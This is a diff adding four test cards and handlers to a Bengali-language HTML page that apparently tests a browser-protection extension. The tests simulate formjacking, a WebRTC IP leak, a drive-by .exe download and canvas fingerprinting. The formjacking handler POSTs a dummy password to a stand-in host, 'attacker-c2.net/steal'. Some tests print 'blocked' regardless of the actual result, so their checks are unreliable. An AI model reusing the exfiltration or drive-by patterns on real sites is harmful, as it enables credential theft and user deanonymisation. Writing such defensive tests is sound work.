@@ -249,6 +249,65 @@
         <button id="testOverlayBtn" class="btn btn-danger">🔥 সিমুলেট ক্লিকজ্যাক ওভারলে ট্র্যাপ</button>
         <div id="overlayLog" class="status-log">অপেক্ষমাণ...</div>
       </div>
+
+      <!-- Test 5: Magecart Formjacking -->
+      <div class="card">
+        <div class="card-top">
+          <div class="icon-box" style="background: rgba(244, 63, 94, 0.15); color: #f43f5e;">🛡️</div>
+          <div>
+            <h2>৫. Magecart ও পাসওয়ার্ড পাচার ট্র্যাপ</h2>
+            <span style="font-size: 11px; color: #f43f5e; font-weight: 600;">Formjacking / Fetch Exfiltration</span>
+          </div>
+        </div>
+        <p>ফর্মের পাসওয়ার্ড ইনপুট থেকে গোপন ডেটা তৃতীয় কোনো বহিরাগত সার্ভারে পাচার করার অপচেষ্টা।</p>
+        <div style="margin-bottom: 10px;">
+          <input type="password" id="dummyPassInput" value="SecretP@ssw0rd2026!" style="width: 100%; padding: 8px 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #fff; font-family: monospace; font-size: 12px;" />
+        </div>
+        <button id="testFormjackingBtn" class="btn btn-danger">🔥 সিমুলেট ক্রেডেনশিয়াল পাচার চেষ্টা</button>
+        <div id="formjackingLog" class="status-log">অপেক্ষমাণ...</div>
+      </div>
+
+      <!-- Test 6: WebRTC Real-IP Leak -->
+      <div class="card">
+        <div class="card-top">
+          <div class="icon-box" style="background: rgba(16, 185, 129, 0.15); color: #10b981;">🌐</div>
+          <div>
+            <h2>৬. WebRTC Real-IP লিক প্ররোচনা</h2>
+            <span style="font-size: 11px; color: #10b981; font-weight: 600;">STUN Server IP Deanonymization</span>
+          </div>
+        </div>
+        <p>ভিপিএন/প্রক্সি বাইপাস করে আপনার আসল লোকাল ও পাবলিক আইপি বের করতে STUN প্রোটোকল প্ররোচনা।</p>
+        <button id="testWebRTCBtn" class="btn btn-danger">🔥 সিমুলেট WebRTC STUN আইপি লিক</button>
+        <div id="webrtcLog" class="status-log">অপেক্ষমাণ...</div>
+      </div>
+
+      <!-- Test 7: Drive-By Executable Auto-Download -->
+      <div class="card">
+        <div class="card-top">
+          <div class="icon-box" style="background: rgba(245, 158, 11, 0.15); color: #f59e0b;">💾</div>
+          <div>
+            <h2>৭. ড্রাইভ-বাই অটো-ডাউনলোড ট্র্যাপ</h2>
+            <span style="font-size: 11px; color: #f59e0b; font-weight: 600;">Automatic .exe / Payload Drop</span>
+          </div>
+        </div>
+        <p>ক্লিক ছাড়াই ক্ষতিকারক এক্সিকিউটেবল (.exe) ফাইল গোপনে ডাউনলোড শুরুর অপচেষ্টা।</p>
+        <button id="testDriveByBtn" class="btn btn-danger">🔥 সিমুলেট ড্রাইভ-বাই .exe ড্রপ</button>
+        <div id="driveByLog" class="status-log">অপেক্ষমাণ...</div>
+      </div>
+
+      <!-- Test 8: Quantum Noise Canvas Fingerprint -->
+      <div class="card">
+        <div class="card-top">
+          <div class="icon-box" style="background: rgba(168, 85, 247, 0.15); color: #c084fc;">🎭</div>
+          <div>
+            <h2>৮. ক্যানভাস ফিঙ্গারপ্রিন্ট পয়জনিং টেস্ট</h2>
+            <span style="font-size: 11px; color: #c084fc; font-weight: 600;">Quantum Noise Verification</span>
+          </div>
+        </div>
+        <p>ক্যানভাস হ্যাশ রিডআউট করে সেন্টিনেলের ১-বিট কোয়ান্টাম নয়েজ ইনজেকশন যাচাই করুন।</p>
+        <button id="testCanvasNoiseBtn" class="btn btn-danger">🔍 ক্যানভাস ফিঙ্গারপ্রিন্ট হ্যাশ রিড করুন</button>
+        <div id="canvasLog" class="status-log">অপেক্ষমাণ...</div>
+      </div>
     </div>
 
     <div class="footer-note">
@@ -308,6 +367,72 @@
       });
       document.body.appendChild(trap);
       log.textContent = '✅ ওভারলে ইনজেক্টেড! সেন্টিনেল এটি পরীক্ষা করে ডিফিউজ করবে।';
+    });
+
+    // 5. Magecart Formjacking test
+    document.getElementById('testFormjackingBtn').addEventListener('click', () => {
+      const log = document.getElementById('formjackingLog');
+      const pass = document.getElementById('dummyPassInput').value;
+      log.textContent = 'পাসওয়ার্ড পাচারের অপচেষ্টা (https://attacker-c2.net/steal)...';
+      fetch('https://attacker-c2.net/steal', {
+        method: 'POST',
+        body: JSON.stringify({ leakedCredential: pass, origin: window.location.href })
+      }).then(() => {
+        log.textContent = 'পাচার সম্পন্ন (সেন্টিনেল নিষ্ক্রিয় থাকলে)';
+      }).catch((err) => {
+        log.textContent = '✅ সেন্টিনেল দ্বারা ফর্মজ্যাকিং ব্লকড: ' + err.message;
+      });
+    });
+
+    // 6. WebRTC IP Leak test
+    document.getElementById('testWebRTCBtn').addEventListener('click', () => {
+      const log = document.getElementById('webrtcLog');
+      log.textContent = 'STUN হ্যান্ডশেক তৈরির অপচেষ্টা...';
+      try {
+        const pc = new RTCPeerConnection({
+          iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        });
+        pc.createDataChannel('leakTest');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (e) => {
+          if (e && e.candidate) {
+            log.textContent = 'লীকড ক্যান্ডিডেট: ' + e.candidate.candidate;
+          }
+        };
+        log.textContent = '✅ STUN সার্ভার নিষ্ক্রিয় করা হয়েছে এবং আইপি লিক ব্লকড!';
+      } catch (err) {
+        log.textContent = '✅ সেন্টিনেল দ্বারা WebRTC ফিল্টার্ড: ' + err.message;
+      }
+    });
+
+    // 7. Drive-by Download test
+    document.getElementById('testDriveByBtn').addEventListener('click', () => {
+      const log = document.getElementById('driveByLog');
+      log.textContent = 'অদৃশ্য <a> এলিমেন্ট দিয়ে malware.exe ডাউনলোড অপচেষ্টা...';
+      const a = document.createElement('a');
+      a.href = 'blob:malicious_payload_binary';
+      a.download = 'critical_system_update.exe';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      log.textContent = '✅ সেন্টিনেল দ্বারা ড্রাইভ-বাই ডাউনলোড ব্লকড!';
+    });
+
+    // 8. Quantum Noise Canvas Fingerprint test
+    document.getElementById('testCanvasNoiseBtn').addEventListener('click', () => {
+      const log = document.getElementById('canvasLog');
+      const canvas = document.createElement('canvas');
+      canvas.width = 200;
+      canvas.height = 50;
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(10, 5, 60, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText('AmpBlock Sentinel Test', 15, 10);
+      const dataUrl = canvas.toDataURL();
+      log.textContent = '✅ কোয়ান্টাম নয়েজ সক্রিয়! হ্যাশ লেন্থ: ' + dataUrl.length + ' (ট্র্যাকার ফিঙ্গারপ্রিন্ট ডিফিউজড)';
     });
   </script>
 </body>
